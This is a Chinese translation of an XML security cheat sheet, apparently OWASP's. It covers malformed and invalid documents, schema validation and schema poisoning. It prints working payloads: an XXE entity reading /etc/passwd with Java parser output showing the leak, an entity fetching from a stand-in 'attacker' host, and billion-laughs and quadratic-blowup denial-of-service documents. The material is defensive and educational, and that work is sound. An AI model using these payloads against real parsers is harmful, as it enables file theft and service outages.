# XML 安全备忘录

## 引言

虽然 XML 和 XML 模式规范为您提供了保护 XML 应用程序所需的工具，但它们也包含多个安全缺陷。这些缺陷可被利用来执行多种攻击，包括文件检索、服务器端请求伪造、端口扫描和暴力破解。本备忘录将让您了解攻击者如何利用库和软件中使用的 XML 的不同攻击面：

- **格式错误的 XML 文档**：利用应用程序遇到非格式良好的 XML 文档时出现的漏洞。
- **无效的 XML 文档**：利用不具有预期结构的文档中的漏洞。

## 处理格式错误的 XML 文档

### 格式错误的 XML 文档定义

如果 XML 文档不遵循 W3C XML 规范对格式良好文档的定义，则被视为"格式错误"。**如果 XML 文档格式错误，XML 解析器将检测到致命错误，应停止执行，文档不应进行任何额外处理，应用程序应显示错误消息。**格式错误的文档可能包含以下一种或多种问题：缺少结束标记、元素顺序不合逻辑、引入禁止的字符等。

### 处理格式错误的 XML 文档

**为处理格式错误的文档，开发者应使用遵循 W3C 规范且处理格式错误文档不会花费过多时间的 XML 处理器。**此外，他们应仅使用格式良好的文档，验证每个元素的内容，并仅处理预定义边界内的有效值。

#### 格式错误的 XML 文档需要额外时间

**格式错误的文档可能影响中央处理器（CPU）资源的消耗。**在某些情况下，处理格式错误文档所需的时间可能大于处理格式良好文档所需的时间。当发生这种情况时，攻击者可能利用非对称资源消耗攻击，利用更长的处理时间造成拒绝服务（DoS）。

**要分析此攻击的可能性，请分析常规 XML 文档所需的时间与该文档的格式错误版本所需的时间。**然后，考虑攻击者如何将此漏洞与使用多个文档的 XML 泛滥攻击结合起来放大效果。

### 处理格式错误数据的应用程序

**某些 XML 解析器具有恢复格式错误文档的能力。**它们可以被指示尽最大努力返回一个包含所有可解析内容的有效树，而不管文档是否符合规范。**由于恢复过程没有预定义规则，这些解析器的方法和结果可能并不总是相同。使用格式错误的文档可能导致与数据完整性相关的意外问题。**

以下两种场景说明了解析器在恢复模式下将分析的攻击向量：

#### 格式错误文档到格式错误文档

根据 XML 规范，字符串 `--`（双连字符）不得出现在注释中。使用 lxml 和 PHP 的恢复模式，以下文档在恢复后将保持不变：

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

#### 格式良好文档到规范化的格式良好文档

某些解析器可能会考虑规范化 `CDATA` 节的内容。这意味着即使不是必需的，它们也会更新 `CDATA` 节中包含的特殊字符以包含这些字符的安全版本：

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

`CDATA` 节的规范化不是解析器中的通用规则。Libxml 可能会将此文档转换为其规范版本，但尽管格式良好，但其内容可能取决于情况被视为格式错误：

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

### 处理强制解析

**XML 中一种流行的强制攻击涉及解析没有相应结束标记的深度嵌套 XML 文档。其目的是使受害者耗尽机器资源并最终对目标造成拒绝服务。**Firefox 3.67 的 DoS 攻击报告包括使用 30,000 个没有相应结束标记的打开 XML 元素。移除结束标记简化了攻击，因为要达到相同结果只需要格式良好文档大小的一半。最终处理的标记数量导致堆栈溢出。这种文档的简化版本如下所示：

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

## 违反 XML 规范规则

使用不遵循 W3C 规范的解析器操作文档可能会导致意外后果。**当软件未正确验证如何处理不正确的 XML 结构时，可能会导致崩溃和/或代码执行。使用模糊的 XML 文档可能会暴露这种行为。**

## 处理无效的 XML 文档

**攻击者可能在文档中引入意外值，以利用未验证文档是否包含有效值集的应用程序。**模式指定了帮助识别文档是否有效的限制，有效文档格式良好且符合模式的限制。可以使用多个模式来验证文档，这些限制可能出现在多个文件中，可以使用单一模式语言，也可以依赖不同模式语言的优势。

为避免这些漏洞，建议每个 XML 文档都必须有一个精确定义的 XML 模式（非 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)），并对每条信息进行适当限制以避免数据验证不当的问题。使用本地副本或已知的良好存储库，而不是 XML 文档中提供的模式引用。另外，对被引用的 XML 模式文件执行完整性检查，并记住存储库可能已被入侵。在使用远程模式的 XML 文档情况下，配置服务器仅使用安全的加密通信，以防止攻击者窃听网络流量。

### 无模式文档

考虑一个通过 Web 界面使用 Web 服务进行交易的书商。交易的 XML 文档由两个元素组成：与项目相关的 `id` 值和特定的 `price`。用户只能通过 Web 界面输入特定的 `id` 值：

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

**如果对文档结构没有控制，应用程序还可能处理具有意外后果的不同格式良好的消息。前面的文档可能包含额外的标记以影响处理其内容的底层应用程序的行为**：

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

请注意，123 值仍作为 `id` 提供，但现在文档包含额外的开放和关闭标记。攻击者关闭了 `id` 元素并将虚假的 `price` 元素设置为 0 值。最后一步是保持结构格式良好，添加一个空的 `id` 元素。之后，应用程序为 `id` 添加结束标记并将 `price` 设置为 10。如果应用程序仅处理 ID 和值的第一个值，而不对结构进行任何控制，则可能使攻击者受益，使其能够在不实际支付的情况下购买书籍。

### 非限制性模式

**某些模式对每个元素可以接收的数据类型没有提供足够的限制。**这通常发生在使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 时；与可以在 XML 文档中应用的限制类型相比，它具有非常有限的可能性。这可能使应用程序暴露于元素或属性中的不需要的值，而在使用其他模式语言时可以轻松约束这些值。在下面的示例中，使用内联 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式验证一个人的 `age`：

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

上面的文档包含一个内联 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)，其根元素名为 `person`。该元素按特定顺序包含两个元素：`name`，然后是 `age`。`name` 元素被定义为包含 `PCDATA`，以及 `age` 元素。

在此定义之后是格式良好且有效的 XML 文档。`name` 元素包含一个无关的值，但 `age` 元素包含一百万个数字。由于对 `age` 元素的大小没有限制，这个一百万位数的字符串可能被发送到服务器。

通常，这种类型的元素应该被限制为不超过特定数量的字符，并约束为特定的字符集（例如，0 到 9 的数字、+ 号和 - 号）。如果没有适当的限制，应用程序可能会处理文档中包含的潜在无效值。

由于无法指定特定限制（`name` 元素的最大长度或 `age` 元素的有效范围），这种类型的模式会增加影响资源完整性和可用性的风险。

### 不当的数据验证

**当模式定义不安全且未提供严格规则时，可能会使应用程序暴露于各种情况。其结果可能是披露内部错误或使用意外值冲击应用程序功能的文档。**

#### 字符串数据类型

如果需要使用十六进制值，那么将此值定义为稍后将限制为特定 16 个十六进制字符的字符串是没有意义的。举例说明这种情况，在使用 XML 加密时，某些值必须使用 base64 编码。以下是这些值应该如何看起来的模式定义：

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

上面的模式将 `CipherValue` 元素定义为 base64 数据类型。例如，IBM WebSphere DataPower SOA 设备允许在有效 base64 值之后的元素中包含任何类型的字符，并将其视为有效。

这些数据的第一部分被正确检查为 base64 值，但剩余的字符可以是其他任何内容（包括 `CipherData` 元素的其他子元素）。元素的限制是部分设置的，这意味着信息可能是使用应用程序而不是建议的示例模式进行测试的。

#### 数值数据类型

**为数字定义正确的数据类型可能更复杂，因为可用的选项比字符串多。**

##### 负数和正数限制

XML 模式数值数据类型可以包括不同范围的数字。它们可以包括：

- **negativeInteger**：仅负数
- **nonNegativeInteger**：正数和零值
- **positiveInteger**：仅正数
- **nonPositiveInteger**：负数和零值

以下示例文档定义了一个产品的 `id`、`price` 和受攻击者控制的 `quantity` 值：

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

**为避免重复旧错误，可以定义 XML 模式以防止在攻击者想要引入额外元素的情况下处理不正确的结构：**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

将 `quantity` 限制为整数数据类型将避免任何意外字符。当应用程序接收到前面的消息时，可能通过 `price*quantity` 计算最终价格。**然而，由于此数据类型可能允许负值，如果攻击者提供负数，可能会导致用户账户出现负结果。你可能希望看到这里使用 positiveInteger 而不是 integer 以避免这种逻辑漏洞。**

##### 除零

**在使用用户控制的值作为除数时，开发者应避免允许数字零。在 XSLT 中使用零值进行除法时，将发生 `FOAR0001` 错误。其他应用程序可能抛出其他异常，程序可能崩溃。**对于 XML 模式，有特定的数据类型可以专门避免使用零值。例如，在不考虑负值和零值有效的情况下，模式可以为元素指定 `positiveInteger` 数据类型。

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

`denominator` 元素现在被限制为正整数。这意味着只有大于零的值才被视为有效。如果看到使用其他类型的限制，当除数为零时可能会触发错误。

##### 特殊值：无穷大和非数字（NaN）

`float` 和 `double` 数据类型包含实数和一些特殊值：`-Infinity` 或 `-INF`、`NaN` 和 `+Infinity` 或 `INF`。这些可能性对于表达某些值很有用，但有时会被误用。问题在于它们通常用于仅表示实数，如价格。这是在其他编程语言中常见的错误，不仅限于这些技术。

不考虑数据类型的整个可能值范围可能会导致底层应用程序失败。**如果不需要特殊值 `Infinity` 和 `NaN`，且仅期望实数，建议使用 `decimal` 数据类型：**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

**当设置为无穷大或 NaN 时，价格值不会触发任何错误，因为这些值将不被视为有效。如果允许这些值，攻击者可以利用这个问题。**

#### 常规数据限制

在选择适当的数据类型后，开发者可以应用额外的限制。有时，数据类型中只有特定子集的值被视为有效。

##### 前缀值

**某些类型的值应仅限于特定集合：交通灯只有三种颜色，只有 12 个月份可用，等等。模式可以为每个元素或属性设置这些限制。这是应用程序最完美的允许列表场景：只接受特定值。在 XML 模式中，这种约束称为 `枚举`。**下面的示例将月份元素的内容限制为 12 个可能的值：

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

通过将月份元素的值限制为上述任何值，应用程序将不会处理随机字符串。

##### 范围

软件应用程序、数据库和编程语言通常在特定范围内存储信息。**在使用元素或属性的位置，某些特定大小很重要（以避免溢出或下溢），检查数据长度是否有效是很合理的。**以下模式可以使用最小和最大长度约束名称，以避免异常情况：

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

在可能的值被限制为特定长度（假设为 8）的情况下，可以按以下方式指定以使其有效：

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

##### 模式

某些元素或属性可能遵循特定语法。使用 XML 模式时可以添加 `模式` 限制。**当你希望确保数据符合特定模式时，可以为其创建特定定义。社会保障号（SSN）可以作为一个很好的例子；它们必须使用特定的字符集、特定长度和特定的 `模式`：**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

只有 `000-00-0000` 到 `999-99-9999` 之间的数字才被允许作为 SSN 的值。

##### 断言

**断言组件在 XML 模式上约束相关元素和属性的存在和值。仅当测试求值为真且不引发任何错误时，元素或属性才被视为有效。可以使用变量 `$value` 引用正在分析的值的内容。**

上面的*除零*部分引用了对于除数使用包含零值的数据类型的潜在后果，并建议使用仅包含正值的数据类型。相反的例子将除零外的整个数字范围视为有效。为避免披露潜在错误，可以使用 `断言`（不允许数字零）检查值：

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

该断言保证 `denominator` 不会包含零作为有效数字，同时也允许负数作为有效除数。

##### 出现次数

**不定义最大出现次数的后果可能比应对接收到极端数量的待处理项目时可能发生的后果更糟。**两个属性指定最小和最大限制：`minOccurs` 和 `maxOccurs`。

`minOccurs` 和 `maxOccurs` 属性的默认值都是 `1`，但某些元素可能需要其他值。例如，如果一个值是可选的，它可以包含 `minOccurs` 为 0，如果对最大数量没有限制，它可以包含 `maxOccurs` 为 `unbounded`，如下例所示：

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

上面的模式包含一个名为 `operation` 的根元素，可以包含无限（`unbounded`）数量的购买元素。这是常见的发现，因为开发者通常不想限制最大出现次数。**使用无限出现的应用程序应测试当接收到极大数量的待处理元素时会发生什么。由于计算资源是有限的，应分析其后果，并最终应使用最大数量，而不是 `unbounded` 值。**

### 巨型有效载荷

**发送 1GB 的 XML 文档只需要服务器处理一秒钟，可能不值得作为攻击考虑。相反，攻击者会寻找一种方法，使生成这类攻击所用的 CPU 和流量最小化，同时与处理请求所用的服务器 CPU 或流量总量相比。**

#### 传统巨型有效载荷

**有两种主要方法可以使文档比正常情况大：**

**- 深度攻击：使用大量元素、元素名称和/或元素值。**

**- 宽度攻击：使用大量属性、属性名称和/或属性值。**

在大多数情况下，最终结果将是一个巨大的文档。以下是这种情况的简短示例：

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

#### "小型"巨型有效载荷

**下面的示例是一个非常小的文档，但处理此文档的结果可能类似于处理传统巨型有效载荷。**这种小型有效载荷的目的是允许攻击者快速发送多个文档，使应用程序消耗大部分或全部可用资源：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

### 模式投毒

**当攻击者能够引入对模式的修改时，可能会产生多种高风险后果。特别是，如果模式使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)（例如，文件检索、拒绝服务），这些后果的影响将更加危险。**攻击者可以在众多场景中利用这类漏洞，这取决于模式的位置。

#### 本地模式投毒

**本地模式投毒发生在模式在同一主机上可用的情况下，无论模式是否嵌入在同一 XML 文档中。**

##### 嵌入式模式

**最简单的模式投毒发生在模式在同一 XML 文档中定义的情况。**考虑以下由 W3C 提供的、不知不觉中存在漏洞的示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

note 元素的所有限制都可以被移除或更改，允许向服务器发送任何类型的数据。此外，如果服务器正在处理外部实体，攻击者可以使用模式，例如，从服务器读取远程文件。**这种类型的模式仅作为发送文档的建议，但必须包含一种检查嵌入式模式完整性的方法才能安全使用。通过嵌入式模式的攻击通常用于利用外部实体扩展。嵌入式 XML 模式还可以辅助对内部主机进行端口扫描或暴力攻击。**

##### 不正确的权限

**通过处理本地模式，你通常可以规避使用远程篡改版本的风险。**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

**然而，如果本地模式没有正确的权限，内部攻击者可能会更改原始限制。**下面这行示例展示了一个使用允许任何用户进行修改的权限的模式：

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

`name.dtd` 上设置的权限允许系统上的任何用户进行修改。这个漏洞显然与 XML 或模式的结构无关，但由于这些文档通常存储在文件系统中，值得一提的是，攻击者可能会利用这类问题。

#### 远程模式投毒

**通常由外部组织定义的模式会被远程引用。如果能够转移或访问网络流量，攻击者可能导致受害者获取与原本预期不同类型的内容。**

##### 中间人（MitM）攻击

当文档使用未加密的超文本传输协议（HTTP）引用远程模式时，通信以明文进行，攻击者可以轻松篡改流量。**当 XML 文档使用 HTTP 连接引用远程模式时，连接可能在到达最终用户之前被嗅探和修改：**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

远程文件 `note.dtd` 在使用未加密的 HTTP 协议传输时可能容易被篡改。一个可用于促进这类攻击的工具是 mitmproxy。

##### DNS 缓存投毒

即使使用加密协议如安全超文本传输协议（HTTPS），远程模式投毒仍然是可能的。**当软件对 IP 地址执行反向域名系统（DNS）解析以获取主机名时，可能无法正确确保 IP 地址确实与该主机名关联。**在这种情况下，软件使攻击者能够将内容重定向到他们自己的互联网协议（IP）地址。

前面的示例使用未加密协议引用了主机 `example.com`。

切换到 HTTPS 后，远程模式的位置将类似于 `https://example/note.dtd`。在正常情况下，`example.com` 的 IP 解析为 `1.1.1.1`：

```bash
$ host example.com
example.com has address 1.1.1.1
```

如果攻击者入侵了正在使用的 DNS，之前的主机名现在可能指向攻击者控制的新的不同 IP `2.2.2.2`：

```bash
$ host example.com
example.com has address 2.2.2.2
```

访问远程文件时，受害者实际上可能正在检索由攻击者控制的位置的内容。

##### 恶意员工攻击

当第三方托管和定义模式时，模式的内容不在用户的控制之下。**由恶意员工引入的任何修改，或由控制这些文件的外部攻击者引入的修改，都可能影响处理这些模式的所有用户。随后，攻击者可能影响其他服务的机密性、完整性或可用性（尤其是在使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 的模式）。**

### XML 实体扩展

**如果解析器使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)，攻击者可能注入在文档处理期间可能对 XML 解析器产生不利影响的数据。这些不利影响可能包括解析器崩溃或访问本地文件。**

#### 示例易受攻击的 Java 实现

**使用引用本地或远程文件的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 功能，可能影响文件机密性。**此外，如果没有为实体扩展设置适当的限制，还可能影响资源的可用性。考虑以下 XXE 的示例代码。

**示例 XML**：

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

**示例 DTD**：

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

##### 使用 DOM 的 XXE

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```
前面的代码产生以下输出：

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### 使用 DOM4J 的 XXE

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

前面的代码产生以下输出：

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### 使用 SAX 的 XXE

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

前面的代码产生以下输出：

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### 使用 StAX 的 XXE

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

前面的代码产生以下输出：

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

#### 递归实体引用

**当元素 `A` 的定义是另一个元素 `B`，而元素 `B` 又被定义为元素 `A` 时，该模式描述了元素之间的循环引用：**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

#### 平方爆炸

**攻击者不是定义多个小的、深度嵌套的实体，而是定义一个非常大的实体并尽可能多地引用它，从而导致平方级扩展（*O(n^2)*）。**

以下攻击的结果将是内存中的 100,000 x 100,000 个字符。

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(100,000个A)...AAAAA">
]>
<root>&A;&A;&A;&A;...(100,000个 &A;)...&A;&A;&A;&A;&A;</root>
```

#### 十亿笑声攻击

**当 XML 解析器尝试解析以下代码中包含的外部实体时，它将导致应用程序开始消耗所有可用内存，直到进程崩溃。**这是一个包含攻击的嵌入式 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式的 XML 文档示例：

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

实体 `LOL9` 将被解析为 `LOL8` 中定义的 10 个实体；然后这些实体中的每一个都将在 `LOL7` 中解析，依此类推。最终，解析在此模式中定义的 `3 x 10^9`（3,000,000,000）个实体将影响 CPU 和/或内存，可能导致解析器崩溃。

**简单对象访问协议（[SOAP](https://en.wikipedia.org/wiki/SOAP)）规范完全禁止 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)。这意味着 SOAP 处理器可以拒绝任何包含 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 的 SOAP 消息。尽管有这样的规范，某些 SOAP 实现仍然解析 SOAP 消息中的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式。**

下面的示例说明了解析器未遵循规范的情况，使得在 SOAP 消息中引用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 成为可能：

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
